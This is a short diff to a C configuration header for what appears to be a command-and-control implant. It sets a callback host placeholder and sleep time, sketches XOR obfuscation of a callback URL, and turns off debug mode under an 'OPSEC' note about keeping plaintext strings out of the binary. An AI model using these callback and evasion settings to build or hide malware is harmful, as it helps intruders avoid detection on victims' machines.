@@ -9,7 +9,6 @@
 #define CALLBACK_SLEEP_TIME 60
 #endif
 
-
 #ifndef CALLBACK_HTTP_HOST
 // IP/Hostname of Callback.
 #define CALLBACK_HTTP_HOST "MACRO_CALLBACK_ADDRESS"
@@ -73,7 +72,7 @@ idea:
  Ex: http://10.0.0.27:MACRO_CALLBACK_PORT/post/%s >>
 
  # xor would return a string, or whatever is needed
- xor(http://10.0.0.27:MACRO_CALLBACK_PORT/post/%s, KEY) 
+ xor(http://10.0.0.27:MACRO_CALLBACK_PORT/post/%s, KEY)
 
  //might hit some type conflicts
 
@@ -84,7 +83,7 @@ idea:
 //================
 // DEBUG
 //================
-#define DEBUG_PRINT 1 // Set to 1 for debug mode, 0 to disable
+#define DEBUG_PRINT 0 // Set to 1 for debug mode, 0 to disable
 // [OPSEC: If this is on (1), plaintext debug strings will be included in the binary]
 
 // TLDR: ChatGPT magic to make a print debug macro
@@ -93,10 +92,7 @@ idea:
 #define DEBUG_LOGW(fmt, ...) wprintf(L"[DEBUG] " fmt L"", ##__VA_ARGS__)
 #define DEBUG_LOGF(stream, fmt, ...) fprintf(stream, "[DEBUG] " fmt "", ##__VA_ARGS__)
 #else
-#define DEBUG_LOG(fmt, ...) // No-op (does nothing)
-#define DEBUG_LOGW(fmt, ...) // No-op (does nothing)
+#define DEBUG_LOG(fmt, ...)          // No-op (does nothing)
+#define DEBUG_LOGW(fmt, ...)         // No-op (does nothing)
 #define DEBUG_LOGF(stream, fmt, ...) // No-op (does nothing)
 #endif
-
-
-
